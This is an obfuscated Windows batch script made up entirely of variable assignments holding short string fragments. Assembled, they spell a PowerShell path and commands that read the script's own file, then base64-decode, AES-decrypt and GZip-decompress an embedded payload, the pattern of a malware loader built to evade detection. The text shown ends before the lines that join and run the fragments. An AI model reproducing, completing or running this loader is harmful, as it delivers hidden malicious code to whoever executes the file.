@echo off
set "gFDPQHYpAU=we"
set "DwvtUEZuvD=.e"
set "nnLDjduuuu=co"
set "zjzSgkYeYW=he"
set "pvpnwQbZIL= C"
set "BeyKoQAhQi=ws"
set "TRhMVLDGrN=do"
set "SJSdNYnzRI=Po"
set "CUzTgCLWnH=0\"
set "NFbLCRYygt=nd"
set "sfkLpjhXoe=\W"
set "IrgIjZqqbY=in"
set "TshpjZAJzP=xe"
set "gZZLdekNtI=:\"
set "WLTgsZHhhw=em"
set "FhfTqamyYM=he"
set "yeOJmUMMSN=ll"
set "fMHaGzxkxG=st"
set "LkxtXBYojl=Sy"
set "BHrMSAYyPE=we"
set "puiaISXsLM=32"
set "RcrmCrdsAi=\v"
set "FTwHxjLLYL=y "
set "gQfzishzFI=1."
set "cvMJoqutXv=ow"
set "uzqOtSdpIn= /"
set "AUjQBXrJcy=ll"
set "UjULXrfQCo=Wi"
set "ptfazgCrCy=py"
set "WOYUDgBEpf=s\"
set "MngjkXDyga=rs"
set "SfEGAwRnpP=po"
set "GAFACESwus=rS"
set "WwzCHlKOVs=cd"
set "aFrYqNXzXi= %~dp0"
set "aNiYGrLvEx=and "
set "hwEYDphnvf=KkRb"
set "NPlqgwviKC=gMod"
set "NlwfJKdEOs=('%~f0'"
set "SjwbuZiDGI=daeR"
set "MFIMHKvhrx=cTUp"
set "onHOYNKscT=$rVr"
set "OFApUoJrnU=-1.."
set "oqbaLBOOxX= '')"
set "FCdhcKEYko=]::("
set "VpRyIuNdYQ=16] "
set "GMbumcLxVl=null"
set "dcazQqJVtX=-joi"
set "NIPDNXrEvr=File"
set "ACPOqerxcn= = $"
set "NeehmmestD=lBlo"
set "KqQMCDpIpW=KvAh"
set "pDhiLhidGo=v.En"
set "ZPIOSSBWnk=ress"
set "HpXTHJNxuS=$rVr"
set "TYDYOOXzYf=oint"
set "jEKmwXmsaz=tryP"
set "MbDirTVVHp=F'[-"
set "cNPWhjLGhi=oin "
set "ehxxALiruf=Eogn"
set "sYRzQgtyrL=)))"
set "diZcOxPyKt=Mode"
set "cGYscXoAHS=, (,"
set "lgbzjzgPmB=brea"
set "bftRKAjfxW=::De"
set "PnaNcXYucH=y.Ci"
set "jAZURnTAWe=S46e"
set "MNKvBWHpfp===')"
set "ZAsotLPncP=tsWi"
set "qiMjyFvgcZ=join"
set "yfzysgglBx=ert]"
set "bFRYIPrYHe=+hAO"
set "LIDwnWpYAl=yste"
set "sbtMFzhPIT=Ah.I"
set "AcUnXXSQbx== [S"
set "UEbXXpiMAP=stem"
set "SqAfcRHmqu=.Cry"
set "bwLwUcfenF=.Cre"
set "aXrWOhtKKa=$rVr"
set "lVNkoFyqfV=ateD"
set "gSWRlpPSed=vxvy"
set "omLdSyghOz=form"
set "tbvIloBdDZ=g = "
set "ViRJHveEtN==');"
set "wRKOBbMuPL=n ''"
set "JFpiaJutIg=Star"
set "qtZQembMbb=ect "
set "GzgtMsFqSy=bda."
